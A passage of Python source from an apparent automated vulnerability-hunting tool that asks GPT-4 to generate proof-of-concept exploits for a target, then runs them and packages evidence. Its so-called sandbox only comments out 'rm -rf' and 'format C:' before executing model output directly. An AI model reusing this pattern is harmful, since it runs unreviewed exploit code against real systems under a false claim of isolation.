            score += 20
        
        # AI confidence boost
        if finding.get('ai_analysis'):
            score += 10
        
        return min(score, 100)
    
    async def _synthesize_pocs(self) -> None:
        """Synthesize proof-of-concept exploits"""
        log.info("  🧪 Synthesizing PoC exploits...")
        
        try:
            for candidate in self.results['zero_day_candidates']:
                if self.openai_client:
                    poc = await self._ai_generate_poc(candidate)
                    if poc:
                        # Validate PoC in sandbox
                        validation_result = await self._validate_poc_sandbox(poc)
                        
                        self.results['pocs'].append({
                            'candidate_id': candidate['candidate_id'],
                            'poc_code': poc,
                            'validation': validation_result,
                            'generated_at': int(time.time())
                        })
            
            self.budget_used += len(self.results['zero_day_candidates'])
            
        except Exception as e:
            log.error(f"    ❌ PoC synthesis failed: {str(e)}")
    
    async def _ai_generate_poc(self, candidate: Dict) -> Optional[str]:
        """Generate PoC using AI"""
        try:
            candidate_summary = json.dumps(candidate, indent=2)
            
            prompt = f"""Generate a minimal proof-of-concept exploit for this vulnerability:

{candidate_summary}

Requirements:
1. Safe for testing (no destructive actions)
2. Clear demonstration of the vulnerability
3. Include comments explaining the exploit
4. Use Python or curl commands
5. Target: {self.scope.target}

Return only the exploit code."""

            response = await self.openai_client.chat.completions.create(
                model="gpt-4",
                messages=[
                    {"role": "system", "content": "You are a security researcher creating safe PoC exploits."},
                    {"role": "user", "content": prompt}
                ],
                max_tokens=1500,
                temperature=0.3
            )
            
            self.results['ai_calls_used'] += 1
            return response.choices[0].message.content
            
        except Exception as e:
            log.warning(f"    ⚠️  PoC generation failed: {str(e)}")
            return None
    
    async def _validate_poc_sandbox(self, poc_code: str) -> Dict:
        """Validate PoC in sandbox environment"""
        try:
            # Create temporary PoC file
            poc_file = self.evidence_dir / f"poc_{uuid.uuid4().hex[:8]}.py"
            
            # Sanitize PoC code (remove dangerous operations)
            safe_poc = poc_code.replace('rm -rf', '# rm -rf')
            safe_poc = safe_poc.replace('format C:', '# format C:')
            
            with open(poc_file, 'w') as f:
                f.write(safe_poc)
            
            # Run in restricted environment
            process = await asyncio.create_subprocess_exec(
                'python3', str(poc_file),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=str(self.evidence_dir)
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(), timeout=30
                )
                
                return {
                    'status': 'completed',
                    'return_code': process.returncode,
                    'stdout': stdout.decode()[:1000],
                    'stderr': stderr.decode()[:1000]
                }
                
            except asyncio.TimeoutError:
                process.kill()
                return {'status': 'timeout', 'error': 'PoC execution timed out'}
        
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
    
    async def _collect_evidence(self) -> None:
        """Collect and package evidence"""
        log.info("  📸 Collecting evidence...")
        
        try:
            # Create evidence package
            evidence_file = self.evidence_dir / f"{self.scope.target}_zero_day_evidence.json"
            
            evidence_package = {
                'target': self.scope.target,
                'scan_timestamp': self.results['timestamp'],
                'findings_summary': {
                    'static_analysis': len(self.results['static_analysis']),
                    'dynamic_analysis': len(self.results['dynamic_analysis']),
                    'fuzzing_results': len(self.results['fuzzing_results']),
                    'zero_day_candidates': len(self.results['zero_day_candidates']),
                    'pocs_generated': len(self.results['pocs'])
                },
                'ai_usage': {
                    'total_calls': self.results['ai_calls_used'],
                    'budget_used': self.budget_used
                },
                'detailed_results': self.results
            }
            
            with open(evidence_file, 'w') as f:
                json.dump(evidence_package, f, indent=2)
            
            # Create ZIP package
            zip_file = self.evidence_dir.parent / f"{self.scope.target}_zero_day_evidence.zip"
            
            with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zf:
                for file_path in self.evidence_dir.rglob('*'):
                    if file_path.is_file():
                        zf.write(file_path, file_path.relative_to(self.evidence_dir))
            
            self.results['evidence'].append({
                'type': 'evidence_package',
                'file': str(zip_file),
                'size': zip_file.stat().st_size if zip_file.exists() else 0
            })
            
        except Exception as e:
            log.error(f"    ❌ Evidence collection failed: {str(e)}")
    
    async def _emit_static_results(self) -> None:
        """Emit static analysis results"""
        await self.bus.emit("zero_day.static_analysis", {
            'target': self.scope.target,
            'findings': self.results['static_analysis'],
            'count': len(self.results['static_analysis']),
            'timestamp': int(time.time())
        })
    
    async def _emit_dynamic_results(self) -> None:
        """Emit dynamic analysis results"""
        await self.bus.emit("zero_day.dynamic_analysis", {
            'target': self.scope.target,
            'findings': self.results['dynamic_analysis'],
            'count': len(self.results['dynamic_analysis']),
            'timestamp': int(time.time())
        })
    
    async def _emit_fuzzing_results(self) -> None:
        """Emit fuzzing results"""
        await self.bus.emit("zero_day.fuzzing", {
            'target': self.scope.target,
            'results': self.results['fuzzing_results'],
            'count': len(self.results['fuzzing_results']),
            'timestamp': int(time.time())
        })
    
    async def _emit_candidates(self) -> None:
        """Emit zero-day candidates"""
        await self.bus.emit("zero_day.candidates", {
            'target': self.scope.target,
            'candidates': self.results['zero_day_candidates'],
            'count': len(self.results['zero_day_candidates']),
            'timestamp': int(time.time())
        })
    
    async def _emit_pocs(self) -> None:
        """Emit PoC results"""
        await self.bus.emit("zero_day.pocs", {
            'target': self.scope.target,
            'pocs': self.results['pocs'],
            'count': len(self.results['pocs']),
            'timestamp': int(time.time())
        })
    
    async def _emit_evidence(self) -> None:
        """Emit evidence collection results"""
        await self.bus.emit("zero_day.evidence", {
            'target': self.scope.target,
            'evidence': self.results['evidence'],
            'evidence_dir': str(self.evidence_dir),
            'timestamp': int(time.time())
        })
    
    def get_results(self) -> Dict[str, Any]:
        """Get zero-day hunting results"""
        return self.results
